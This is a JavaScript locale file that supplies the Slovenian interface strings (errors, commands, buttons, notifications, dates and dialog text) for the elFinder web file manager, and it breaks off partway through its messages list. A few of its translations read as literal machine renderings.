/**
 * Slovenščina translation
 * @author Damjan Rems <d_rems at yahoo.com>
 * @version 2022-03-03
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.sl = {
		translator : 'Damjan Rems &lt;d_rems at yahoo.com&gt;',
		language   : 'Slovenščina',
		direction  : 'ltr',
		dateFormat : 'd.m.Y H:i', // will show like: 03.03.2022 12:34
		fancyDateFormat : '$1 H:i', // will show like: Danes 12:34
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220303-123418
		messages   : {
			'getShareText' : 'Deliti',
			'Editor ': 'Urejevalnik kode',

			/********************************** errors **********************************/
			'error'                : 'Napaka',
			'errUnknown'           : 'Neznana napaka.',
			'errUnknownCmd'        : 'Neznan ukaz.',
			'errJqui'              : 'Napačna jQuery UI nastavitev. Selectable, draggable in droppable dodatki morajo biti vključeni.',
			'errNode'              : 'elFinder potrebuje "DOM Element".',
			'errURL'               : 'Napačna nastavitev elFinder-ja! Manjka URL nastavitev.',
			'errAccess'            : 'Dostop zavrnjen.',
			'errConnect'           : 'Ne morem se priključiti na "backend".',
			'errAbort'             : 'Povezava prekinjena (aborted).',
			'errTimeout'           : 'Povezava potekla (timeout).',
			'errNotFound'          : 'Nisem našel "backend-a".',
			'errResponse'          : 'Napačni "backend" odgovor.',
			'errConf'              : 'Napačna "backend" nastavitev.',
			'errJSON'              : 'JSON modul ni instaliran.',
			'errNoVolumes'         : 'Bralne količine niso na voljo.',
			'errCmdParams'         : 'Napačni parametri za ukaz "$1".',
			'errDataNotJSON'       : 'Podatki niso v JSON obliki.',
			'errDataEmpty'         : 'Ni podatkov oz. so prazni.',
			'errCmdReq'            : '"Backend" zahtevek potrebuje ime ukaza.',
			'errOpen'              : '"$1" ni možno odpreti.',
			'errNotFolder'         : 'Objekt ni mapa.',
			'errNotFile'           : 'Objekt ni datoteka.',
			'errRead'              : '"$1" ni možno brati.',
			'errWrite'             : 'Ne morem pisati v "$1".',
			'errPerm'              : 'Dostop zavrnjen.',
			'errLocked'            : '"$1" je zaklenjen(a) in je ni možno preimenovati, premakniti ali izbrisati.',
			'errExists'            : 'Datoteka z imenom "$1" že obstaja.',
			'errInvName'           : 'Napačno ime datoteke.',
			'errInvDirname'        : 'Neveljavno ime mape.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Mape nisem našel.',
			'errFileNotFound'      : 'Datoteke nisem našel.',
			'errTrgFolderNotFound' : 'Ciljna mapa "$1" ne obstaja.',
			'errPopup'             : 'Brskalnik je preprečil prikaz (popup) okna. Za vpogled datoteke omogočite nastavitev v vašem brskalniku.',
			'errMkdir'             : 'Ni možno dodati mape "$1".',
			'errMkfile'            : 'Ni možno dodati datoteke "$1".',
			'errRename'            : 'Ni možno preimenovati "$1".',
			'errCopyFrom'          : 'Kopiranje datotek iz "$1" ni dovoljeno.',
			'errCopyTo'            : 'Kopiranje datotek na "$1" ni dovoljeno.',
			'errMkOutLink'         : 'Povezave z izven korenskega nosilca ni mogoče ustvariti.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Napaka pri prenosu.',  // old name - errUploadCommon
			'errUploadFile'        : '"$1" ni možno naložiti (upload).', // old name - errUpload
			'errUploadNoFiles'     : 'Ni datotek za nalaganje (upload).',
			'errUploadTotalSize'   : 'Podatki presegajo največjo dovoljeno velikost.', // old name - errMaxSize
			'errUploadFileSize'    : 'Datoteka presega največjo dovoljeno velikost.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Datoteke s to končnico niso dovoljene.',
			'errUploadTransfer'    : '"$1" napaka pri prenosu.',
			'errUploadTemp'        : 'Ni mogoče ustvariti začasne datoteke za nalaganje.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'Objekt "$1" že obstaja na tej lokaciji in ga ni mogoče nadomestiti s predmetom druge vrste.', // new
			'errReplace'           : '"$1" ni mogoče zamenjati.',
			'errSave'              : '"$1" ni možno shraniti.',
			'errCopy'              : '"$1" ni možno kopirati.',
			'errMove'              : '"$1" ni možno premakniti.',
			'errCopyInItself'      : '"$1" ni možno kopirati samo vase.',
			'errRm'                : '"$1" ni možno izbrisati.',
			'errTrash'             : 'Ni mogoče v smeti.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Izvornih datotek ni mogoče odstraniti.',
			'errExtract'           : 'Datotek iz "$1" ni možno odpakirati.',
			'errArchive'           : 'Napaka pri delanju arhiva.',
			'errArcType'           : 'Nepodprta vrsta arhiva.',
			'errNoArchive'         : 'Datoteka ni arhiv ali vrsta arhiva ni podprta.',
			'errCmdNoSupport'      : '"Backend" ne podpira tega ukaza.',
			'errReplByChild'       : 'Mape “$1” ni možno zamenjati z vsebino mape.',
			'errArcSymlinks'       : 'Zaradi varnostnih razlogov arhiva ki vsebuje "symlinks" ni možno odpakirati.', // edited 24.06.2012
			'errArcMaxSize'        : 'Datoteke v arhivu presegajo največjo dovoljeno velikost.',
			'errResize'            : '"$1" ni možno razširiti.',
			'errResizeDegree'      : 'Neveljavna stopnja vrtenja.',  // added 7.3.2013
			'errResizeRotate'      : 'Slike ni mogoče zasukati.',  // added 7.3.2013
			'errResizeSize'        : 'Neveljavna velikost slike.',  // added 7.3.2013
			'errResizeNoChange'    : 'Velikost slike ni spremenjena.',  // added 7.3.2013
			'errUsupportType'      : 'Nepodprta vrsta datoteke.',
			'errNotUTF8Content'    : 'Datoteka "$1" ni v UTF-8 in je ni mogoče urejati.',  // added 9.11.2011
			'errNetMount'          : '"$1" ni mogoče priklopiti.', // added 17.04.2012
			'errNetMountNoDriver'  : 'Nepodprt protokol.',     // added 17.04.2012
			'errNetMountFailed'    : 'Montaža ni uspela.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Potreben je gostitelj.', // added 18.04.2012
			'errSessionExpires'    : 'Vaša seja je potekla zaradi neaktivnosti.',
			'errCreatingTempDir'   : 'Ni mogoče ustvariti začasnega imenika: "$1"',
			'errFtpDownloadFile'   : 'Ni mogoče prenesti datoteke s FTP: "$1"',
			'errFtpUploadFile'     : 'Datoteke ni mogoče naložiti na FTP: "$1"',
			'errFtpMkdir'          : 'Ni mogoče ustvariti oddaljenega imenika na FTP: "$1"',
			'errArchiveExec'       : 'Napaka pri arhiviranju datotek: "$1"',
			'errExtractExec'       : 'Napaka pri ekstrakciji datotek: "$1"',
			'errNetUnMount'        : 'Ni mogoče odklopiti.', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Ni mogoče pretvoriti v UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Preizkusite sodobni brskalnik, če želite naložiti mapo.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Časovna omejitev je potekla med iskanjem »$1«. Rezultat iskanja je delen.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Potrebno je ponovno pooblastilo.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Največje število izbirnih elementov je 1 dolar.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Ni mogoče obnoviti iz koša. Cilja obnovitve ni mogoče določiti.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Urejevalnika za to vrsto datoteke ni bilo mogoče najti.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Na strani strežnika je prišlo do napake.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Ni mogoče izprazniti mape "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Obstaja še 1 $ napak.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Naenkrat lahko ustvarite do $1 map.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Naredi arhiv',
			'cmdback'      : 'Nazaj',
			'cmdcopy'      : 'Kopiraj',
			'cmdcut'       : 'Izreži',
			'cmddownload'  : 'Poberi (download)',
			'cmdduplicate' : 'Podvoji',
			'cmdedit'      : 'Uredi datoteko',
			'cmdextract'   : 'Odpakiraj datoteke iz arhiva',
			'cmdforward'   : 'Naprej',
			'cmdgetfile'   : 'Izberi datoteke',
			'cmdhelp'      : 'Več o',
			'cmdhome'      : 'Domov',
			'cmdinfo'      : 'Lastnosti',
			'cmdmkdir'     : 'Nova mapa',
			'cmdmkdirin'   : 'V novo mapo', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Nova datoteka',
			'cmdopen'      : 'Odpri',
			'cmdpaste'     : 'Prilepi',
			'cmdquicklook' : 'Hitri ogled',
			'cmdreload'    : 'Osveži',
			'cmdrename'    : 'Preimenuj',
			'cmdrm'        : 'Izbriši',
			'cmdtrash'     : 'V smeti', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Obnovi', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Poišči datoteke',
			'cmdup'        : 'Mapa nazaj',
			'cmdupload'    : 'Naloži (upload)',
			'cmdview'      : 'Ogled',
			'cmdresize'    : 'Povečaj (pomanjšaj) sliko',
			'cmdsort'      : 'Razvrsti',
			'cmdnetmount'  : 'Namestite omrežno glasnost', // added 18.04.2012
			'cmdnetunmount': 'Odklopi', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'Na mesta', // added 28.12.2014
			'cmdchmod'     : 'Spremeni način', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Odprite mapo', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Ponastavi širino stolpca', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Celozaslonski način', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Premakni se', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Izpraznite mapo', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Razveljavi', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Ponovi', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Nastavitve', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Izberi vse', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Izberite nobenega', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Obrni izbor', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Odpri v novem oknu', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Skrij (nastavitev)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Zapri',
			'btnSave'   : 'Shrani',
			'btnRm'     : 'Izbriši',
			'btnApply'  : 'Uporabi',
			'btnCancel' : 'Prekliči',
			'btnNo'     : 'Ne',
			'btnYes'    : 'Da',
			'btnMount'  : 'Mount',  // added 18.04.2012
			'btnApprove': 'Pojdi na $1 in odobri', // from v2.1 added 26.04.2012
			'btnUnmount': 'Odklopi', // from v2.1 added 30.04.2012
			'btnConv'   : 'Pretvorba', // from v2.1 added 08.04.2014
			'btnCwd'    : 'tukaj',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Glasnost',    // from v2.1 added 22.5.2015
			'btnAll'    : 'vse',       // from v2.1 added 22.5.2015
			'btnMime'   : 'Vrsta MIME', // from v2.1 added 22.5.2015
			'btnFileName':'Ime datoteke',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Shrani in zapri', // from v2.1 added 12.6.2015
			'btnBackup' : 'Rezerva', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Preimenuj',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Preimenuj (vse)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Prejšnja (1 $/2 $)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Naslednji (1 $/2 $)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Shrani kot', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Odpri mapo',
			'ntffile'     : 'Odpri datoteko',
			'ntfreload'   : 'Osveži vsebino mape',
			'ntfmkdir'    : 'Ustvarjam mapo',
			'ntfmkfile'   : 'Ustvarjam datoteke',
			'ntfrm'       : 'Brišem datoteke',
			'ntfcopy'     : 'Kopiram datoteke',
			'ntfmove'     : 'Premikam datoteke',
			'ntfprepare'  : 'Pripravljam se na kopiranje datotek',
			'ntfrename'   : 'Preimenujem datoteke',
			'ntfupload'   : 'Nalagam (upload) datoteke',
			'ntfdownload' : 'Pobiram (download) datoteke',
			'ntfsave'     : 'Shranjujem datoteke',
			'ntfarchive'  : 'Ustvarjam arhiv',
			'ntfextract'  : 'Razpakiram datoteke iz arhiva',
			'ntfsearch'   : 'Iščem datoteke',
			'ntfresize'   : 'Spreminjanje velikosti slik',
			'ntfsmth'     : 'Počakaj delam >_<',
			'ntfloadimg'  : 'Nalagam sliko',
			'ntfnetmount' : 'Montaža omrežne glasnosti', // added 18.04.2012
			'ntfnetunmount': 'Odstranitev omrežnega nosilca', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Pridobivanje dimenzije slike', // added 20.05.2013
			'ntfreaddir'  : 'Branje informacij o mapi', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Pridobivanje URL-ja povezave', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Spreminjanje načina datoteke', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Preverjanje imena datoteke za nalaganje', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Ustvarjanje datoteke za prenos', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Pridobivanje informacij o poti', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Obdelava naložene datoteke', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Vrzi v smeti', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Obnovitev iz koša', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Preverjanje ciljne mape', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Razveljavitev prejšnje operacije', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Ponavljanje prejšnjega razveljavljenega', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Preverjanje vsebine', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'smeti', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'neznan',
			'Today'       : 'Danes',
			'Yesterday'   : 'Včeraj',
			'msJan'       : 'Jan',
			'msFeb'       : 'februarja',
			'msMar'       : 'mar',
			'msApr'       : 'apr',
			'msMay'       : 'Maj',
			'msJun'       : 'Jun',
			'msJul'       : 'jul',
			'msAug'       : 'Avg',
			'msSep'       : 'sep',
			'msOct'       : 'Okt',
			'msNov'       : 'nov',
			'msDec'       : 'dec',
			'January'     : 'Januar',
			'February'    : 'Februar',
			'March'       : 'Marec',
			'April'       : 'aprila',
			'May'         : 'Maj',
			'June'        : 'Junij',
			'July'        : 'Julij',
			'August'      : 'Avgust',
			'September'   : 'septembra',
			'October'     : 'Oktober',
			'November'    : 'novembra',
			'December'    : 'december',
			'Sunday'      : 'Nedelja',
			'Monday'      : 'Ponedeljek',
			'Tuesday'     : 'Torek',
			'Wednesday'   : 'Sreda',
			'Thursday'    : 'Četrtek',
			'Friday'      : 'Petek',
			'Saturday'    : 'Sobota',
			'Sun'         : 'Ned',
			'Mon'         : 'Pon',
			'Tue'         : 'Tor',
			'Wed'         : 'Sre',
			'Thu'         : 'Čet',
			'Fri'         : 'Pet',
			'Sat'         : 'Sob',

			/******************************** sort variants ********************************/
			'sortname'          : 'po imenu',
			'sortkind'          : 'po vrsti',
			'sortsize'          : 'po velikosti',
			'sortdate'          : 'po datumu',
			'sortFoldersFirst'  : 'Najprej mape',
			'sortperm'          : 'z dovoljenjem', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'po načinu',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 's strani lastnika',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'po skupini',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'Tudi Treeview',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'NewFile.txt', // added 10.11.2015
			'untitled folder'   : 'Nova mapa',   // added 10.11.2015
			'Archive'           : 'NewArchive',  // from v2.1 added 10.11.2015
			'untitled file'     : 'Nova datoteka.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: datoteka',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '1 $: 2 $',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Zahtevana je potrditev',
			'confirmRm'       : 'Ste prepričani, da želite izbrisati datoteko?<br/>POZOR! Tega ukaza ni možno preklicati!',
			'confirmRepl'     : 'Zamenjam staro datoteko z novo?',
			'confirmRest'     : 'Ali želite obstoječi element zamenjati s predmetom v smetnjaku?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Ni v UTF-8<br/>Pretvoriti v UTF-8?<br/>Vsebina postane UTF-8 s shranjevanjem po pretvorbi.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Kodiranja znakov te datoteke ni bilo mogoče zaznati. Za urejanje ga je treba začasno pretvoriti v UTF-8.<br/>Prosimo, izberite kodiranje znakov te datoteke.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Spremenjeno je bilo.<br/>Če ne shranite sprememb, boste izgubili delo.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Ali ste prepričani, da želite premakniti predmete v koš za smeti?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Ali ste prepričani, da želite premakniti elemente v »$1«?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Uporabi pri vseh',
			'name'            : 'Ime',
			'size'            : 'Velikost',
			'perms'           : 'Dovoljenja',
			'modify'          : 'Spremenjeno',
			'kind'            : 'Vrsta',
			'read'            : 'beri',
			'write'           : 'piši',
			'noaccess'        : 'ni dostopa',
			'and'             : 'in',
			'unknown'         : 'neznan',
			'selectall'       : 'Izberi vse datoteke',
			'selectfiles'     : 'Izberi datotek(o)e',
			'selectffile'     : 'Izberi prvo datoteko',
			'selectlfile'     : 'Izberi zadnjo datoteko',
			'viewlist'        : 'Seznam',
			'viewicons'       : 'Ikone',
			'viewSmall'       : 'Majhne ikone', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Srednje ikone', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Velike ikone', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Izjemno velike ikone', // from v2.1.39 added 22.5.2018
			'places'          : 'Mesta (places)',
			'calc'            : 'Izračun',
			'path'            : 'Pot do',
			'aliasfor'        : 'Sopomenka (alias) za',
			'locked'          : 'Zaklenjeno',
			'dim'             : 'Dimenzije',
			'files'           : 'Datoteke',
			'folders'         : 'Mape',
			'items'           : 'Predmeti',
			'yes'             : 'da',
			'no'              : 'ne',
			'link'            : 'Povezava',
			'searcresult'     : 'Rezultati iskanja',
			'selected'        : 'izbrani predmeti',
			'about'           : 'Več o',
			'shortcuts'       : 'Bližnjice',
			'help'            : 'Pomoč',
			'webfm'           : 'Spletni upravitelj datotek',
			'ver'             : 'Verzija',
			'protocolver'     : 'verzija protokola',
			'homepage'        : 'Domača stran',
			'docs'            : 'Dokumentacija',
			'github'          : 'Fork us on Github',
			'twitter'         : 'Sledi na twitterju',
			'facebook'        : 'Pridruži se nam na facebook-u',
			'team'            : 'Tim',
			'chiefdev'        : 'Glavni razvijalec',
			'developer'       : 'razvijalec',
			'contributor'     : 'sodelavec',
			'maintainer'      : 'vzdrževalec',
			'translator'      : 'prevajalec',
			'icons'           : 'Ikone',
			'dontforget'      : 'In ne pozabi na brisačo',
			'shortcutsof'     : 'Bližnjica onemogočena',
			'dropFiles'       : 'Datoteke spusti tukaj',
			'or'              : 'ali',
			'selectForUpload' : 'Izberi datoteke za nalaganje',
			'moveFiles'       : 'Premakni datoteke',
			'copyFiles'       : 'Kopiraj datoteke',
			'restoreFiles'    : 'Obnovite predmete', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Izbriši iz mesta (places)',
			'aspectRatio'     : 'Razmerje slike',
			'scale'           : 'Razširi',
			'width'           : 'Širina',
			'height'          : 'Višina',
			'resize'          : 'Povečaj',
			'crop'            : 'Obreži',
			'rotate'          : 'Zavrti',
			'rotate-cw'       : 'Zavrti 90 st. v smeri ure',
			'rotate-ccw'      : 'Zavrti 90 st. v obratni smeri ure',
			'degree'          : 'Stopnja',
			'netMountDialogTitle' : 'Namestite omrežno glasnost', // added 18.04.2012
			'protocol'            : 'Protokol', // added 18.04.2012
			'host'                : 'Gostitelj', // added 18.04.2012
			'port'                : 'pristanišče', // added 18.04.2012
			'user'                : 'Uporabnik', // added 18.04.2012
			'pass'                : 'Geslo', // added 18.04.2012
			'confirmUnmount'      : 'Ali odklopite $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Spustite ali prilepite datoteke iz brskalnika', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Sem spustite datoteke, prilepite URL-je ali slike (odložišče).', // from v2.1 added 07.04.2014
			'encoding'        : 'Kodiranje', // from v2.1 added 19.12.2014
			'locale'          : 'Locale',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Cilj: 1 dolar',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Iskanje po vhodni vrsti MIME', // from v2.1 added 22.5.2015
			'owner'           : 'Lastnik', // from v2.1 added 20.6.2015
			'group'           : 'Skupina', // from v2.1 added 20.6.2015
			'other'           : 'Drugo', // from v2.1 added 20.6.2015
			'execute'         : 'Izvedite', // from v2.1 added 20.6.2015
			'perm'            : 'dovoljenje', // from v2.1 added 20.6.2015
			'mode'            : 'način', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Mapa je prazna', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Mapa je prazna\\A Spustite, da dodate elemente', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Mapa je prazna\\A Dolg tapnite, da dodate elemente', // from v2.1.6 added 30.12.2015
			'quality'         : 'Kakovost', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Samodejna sinhronizacija',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Pomakni se navzgor',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Pridobite URL povezavo', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Izbrani predmeti (1 $)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'ID mape', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Dovoli dostop brez povezave', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Za ponovno avtentikacijo', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Zdaj se nalaga ...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Odprite več datotek', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Poskušate odpreti datoteke $1. Ali ste prepričani, da želite odpreti v brskalniku?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Rezultati iskanja so prazni v iskalnem cilju.', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Ureja datoteko.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Izbrali ste $1 predmetov.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'V odložišče imate 1 $ elementov.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Inkrementalno iskanje je samo iz trenutnega pogleda.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Obnovi', // from v2.1.15 added 3.8.2016
			'complete'        : '1 $ dokončan', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Kontekstni meni', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Obračanje strani', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Volumenske korenine', // from v2.1.16 added 16.9.2016
			'reset'           : 'Ponastaviti', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Barva ozadja', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Izbirnik barv', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : 'Mreža 8px', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Omogočeno', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Onemogočeno', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Rezultati iskanja so prazni v trenutnem pogledu.\\APritisnite [Enter], da razširite cilj iskanja.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Search results is empty in current view.\\APress [Enter] to expand search target.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Besedilna oznaka', // from v2.1.17 added 13.10.2016
			'minsLeft'        : 'Še 1 min', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Ponovno odprite z izbranim kodiranjem', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Shrani z izbranim kodiranjem', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Izberite mapo', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Iskanje prve črke', // from v2.1.23 added 24.3.2017
			'presets'         : 'Prednastavitve', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Preveč je predmetov, tako da ne gre v smeti.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'TextArea', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Izpraznite mapo "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'V mapi "$1" ni elementov.', // from v2.1.25 added 22.6.2017
			'preference'      : 'Prednost', // from v2.1.26 added 28.6.2017
			'language'        : 'Jezik', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Inicializirajte nastavitve, shranjene v tem brskalniku', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Nastavitve orodne vrstice', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... ostane 1 znak.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... še $1 vrstice.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'vsota', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Približna velikost datoteke', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Osredotočite se na element pogovornega okna s pomikom miške',  // from v2.1.30 added 2.11.2017
			'select'          : 'Izberite', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Dejanje ob izbiri datoteke', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Odprite z nazadnje uporabljenim urejevalnikom', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Obrni izbor', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Ali ste prepričani, da želite preimenovati izbrane elemente $1, kot je $2?<br/>Tega ni mogoče razveljaviti!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Paketno preimenovanje', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Številka', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Dodajte predpono', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Dodajte pripono', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Spremeni razširitev', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Nastavitve stolpcev (pogled seznama)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Vse spremembe se bodo takoj odrazile v arhivu.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Vse spremembe se ne bodo odrazile, dokler ne odklopite tega nosilca.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Naslednji nosilci, nameščeni na ta nosilec, so se prav tako odklopili. Ali ste prepričani, da ga boste odklopili?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Informacije o izbiri', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Algoritmi za prikaz hash datoteke', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Informacijski elementi (informacijska plošča za izbor)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Ponovno pritisnite za izhod.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Orodna vrstica', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Delovni prostor', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Dialog', // from v2.1.38 added 4.4.2018
			'all'             : 'vse', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Velikost ikone (pogled ikon)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Odprite okno povečanega urejevalnika', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Ker pretvorba prek API-ja trenutno ni na voljo, prosimo pretvorite na spletnem mestu.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'Po pretvorbi morate biti naloženi z URL-jem elementa ali preneseno datoteko, da shranite pretvorjeno datoteko.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Pretvarjanje na spletnem mestu $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Integracije', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'Ta elFinder ima vgrajene naslednje zunanje storitve. Pred uporabo preverite pogoje uporabe, politiko zasebnosti itd.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Pokaži skrite predmete', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Skrij skrite predmete', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Pokaži/skrij skrite predmete', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Vrste datotek, ki jih želite omogočiti z "Nova datoteka"', // from v2.1.41 added 7.8.2018
